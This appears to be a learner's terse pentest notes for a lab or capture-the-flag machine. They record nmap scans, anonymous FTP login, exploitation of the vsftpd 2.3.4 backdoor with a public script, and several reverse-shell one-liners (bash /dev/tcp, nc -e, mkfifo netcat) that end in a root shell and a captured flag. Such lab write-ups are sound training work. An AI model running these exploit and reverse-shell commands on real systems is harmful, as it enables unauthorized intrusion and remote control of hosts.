@@ -1,0 +1,84 @@
+nmap scan 
+	vsftpd 2.0.8
+	openssh 8.2p1
+		 none of the servers are vulnerable 
+	ssh connection 
+		ssh admin@10.150.150.12 
+			did not work
+	ftp connection 
+		ftp 10.150.150.12
+			username:anonymous
+			pass : admin
+				login successful 
+				ls -la 
+nmap -sC -sV 10.150.150.12
+	vsftpd 2.3.4
+		searchsploit vsftpd 2.3.4
+			vsftpd 2.3.4 - Backdoor Command Execution | unix/remote/49757.py                                                                                 | unix/remote/49757.py
+			vsftpd 2.3.4 - Backdoor Command Execution (Metasploit) | unix/remote/17491.rb
+		unix/remote/17491.rb
+			 searchsploit -x unix/remote/17491.rb
+			 	cp /usr/share/exploitdb/exploits/unix/remote/17491.rb /home/kali/pwntilldwm/lab/10.150.150.12/exploits
+			 	trying msf
+			 ```msfconsole
+			 	```search vsftp 2.3.4
+			 	```use 0
+			 	```options
+			 	```set rhost 10.150.150.12
+			 	```run
+			 	```DID NOT WORK 
+		Using the exploit 
+			Usage: ./vsftpd_234_exploit.py [IP address] [port] [command] Example: ./vsftpd_234_exploit.py 192.168.1.10 21 whoami
+				source : https://github.com/ahervias77/vsftpd-2.3.4-exploit/blob/master/README.md
+			--
+				wget https://github.com/ahervias77/vsftpd-2.3.4-exploit/blob/master/vsftpd_234_exploit.py xxdoesnt work
+				download the exploit file 
+				chmod +x vsftpd_234_exploit.py
+					usage
+						python3 vsftpd_234_exploit.py 10.150.150.12 21 whoami
+							root
+						python3 vsftpd_234_exploit.py 10.150.150.12 21 ls
+							flag1.txt 
+							snap
+						python3 vsftpd_234_exploit.py 10.150.150.12 21 cat flag1.txt
+							error\
+			reverse shell
+				-my ip = 10.66.66.206
+				'bash -i >& /dev/tcp/10.66.66.206/444 0>&1'
+				or
+				'nc -e /bin/sh 10.0.0.1 4444'
+				-- source : https://github.com/d4t4s3c/Offensive-Reverse-Shell-Cheat-Sheet
+					ps: all the payloads did not work cos the netcat doesnt have -e 
+				except fifo
+					rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.2 443 >/tmp/f
+			using the reverse shell with the exploit
+				setup net-cat server 
+					nc -nlvp 4444
+				python3 vsftpd_234_exploit.py 10.150.150.12 21 'bash -i >& /dev/tcp/10.66.66.206/444 0>&1' xxx
+				or
+				python3 vsftpd_234_exploit.py 10.150.150.12 21 'nc -e /bin/sh 10.0.0.1 4444' xxx
+				or
+				python3 vsftpd_234_exploit.py 10.150.150.12 21 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.66.66.206 4444 >/tmp/f
+				-- got a reverse shell
+						ls
+							flag1.txt
+						cat flag1.txt
+							5ee499eb5d0b8e4269b13483e57adaa0b3815f48
+							BOOOMMMMM
+						
+				
+					
+				
+				  
+				
+							
+			
+				
+Note:
+	export ip="10.10.10.10" -- ip will be the alias of the specified ip address or command
+		echo $ip
+	auto recon
+	
+	
+	
+		
